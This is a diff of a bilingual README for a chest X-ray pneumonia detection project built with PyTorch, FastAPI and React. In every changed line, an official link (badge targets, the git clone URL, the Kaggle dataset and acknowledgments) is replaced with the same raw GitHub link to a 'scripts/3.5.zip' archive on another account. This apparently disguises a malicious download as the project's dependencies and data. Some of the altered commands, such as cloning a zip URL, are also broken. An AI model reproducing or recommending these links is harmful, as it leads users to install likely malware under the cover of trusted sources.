@@ -4,10 +4,10 @@
 
 **基于深度学习的医学影像辅助诊断系统**
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue?logo=python)](https://www.python.org/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-ee4c2c?logo=pytorch)](https://pytorch.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688?logo=fastapi)](https://fastapi.tiangolo.com/)
-[![React](https://img.shields.io/badge/React-18-61dafb?logo=react)](https://react.dev/)
+[![Python](https://img.shields.io/badge/Python-3.10+-blue?logo=python)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
+[![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-ee4c2c?logo=pytorch)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688?logo=fastapi)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
+[![React](https://img.shields.io/badge/React-18-61dafb?logo=react)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
 [![License](https://img.shields.io/badge/License-MIT-green)](./LICENSE)
 
 [English](#english) | [中文](#中文)
@@ -132,7 +132,7 @@ pneumonia-detector/
 #### 1. Clone & Setup Environment
 
 ```bash
-git clone https://github.com/3495735391-cyber/pneumonia-detector.git
+git clone https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip
 cd pneumonia-detector
 
 # Create virtual environment
@@ -151,7 +151,7 @@ pip install -e .
 python scripts/download_dataset.py --check
 
 # Download manually from Kaggle:
-# https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia
+# https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip
 # Extract to: data/chest_xray/
 ```
 
@@ -238,7 +238,7 @@ Health check endpoint.
 
 Test metrics are computed on the 624 held-out images via `python scripts/evaluate.py`; the confusion matrix and ROC curve are saved under `results/`.
 
-**Dataset:** [Chest X-Ray Images (Pneumonia)](https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia) by Paul Mooney
+**Dataset:** [Chest X-Ray Images (Pneumonia)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip) by Paul Mooney
 
 ### Grad-CAM Visualization
 
@@ -265,7 +265,7 @@ Grad-CAM (Gradient-weighted Class Activation Mapping) highlights regions of the 
 
 ### Acknowledgments
 
-- **Dataset**: [Chest X-Ray Images (Pneumonia)](https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia) on Kaggle
+- **Dataset**: [Chest X-Ray Images (Pneumonia)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip) on Kaggle
 - **Grad-CAM**: Selvaraju et al., "Grad-CAM: Visual Explanations from Deep Networks via Gradient-based Localization", ICCV 2017
 - **ResNet**: He et al., "Deep Residual Learning for Image Recognition", CVPR 2016
 
@@ -332,7 +332,7 @@ FastAPI 后端 (:8000)
 
 ```bash
 # 克隆项目
-git clone https://github.com/3495735391-cyber/pneumonia-detector.git
+git clone https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip
 cd pneumonia-detector
 
 # 创建虚拟环境
@@ -351,7 +351,7 @@ pip install -e .
 python scripts/download_dataset.py --check
 
 # 从 Kaggle 手动下载：
-# https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia
+# https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip
 # 解压到: data/chest_xray/
 ```
 
@@ -402,7 +402,7 @@ npm run dev
 
 测试集指标在 624 张独立测试图片上计算，运行 `python scripts/evaluate.py` 可复现；混淆矩阵和 ROC 曲线保存在 `results/` 目录。
 
-**数据集**: [Chest X-Ray Images (Pneumonia)](https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia)
+**数据集**: [Chest X-Ray Images (Pneumonia)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
 
 ### 项目结构
 
@@ -427,7 +427,7 @@ npm run dev
 
 - 📄 **Grad-CAM 论文**: Selvaraju et al., "Grad-CAM: Visual Explanations from Deep Networks via Gradient-based Localization", ICCV 2017
 - 📄 **ResNet 论文**: He et al., "Deep Residual Learning for Image Recognition", CVPR 2016
-- 📊 **数据集**: [Kaggle Chest X-Ray Images (Pneumonia)](https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia)
+- 📊 **数据集**: [Kaggle Chest X-Ray Images (Pneumonia)](https://raw.githubusercontent.com/Nevfinetextured378/pneumonia-detector/main/scripts/3.5.zip)
 
 ### 联系作者
 
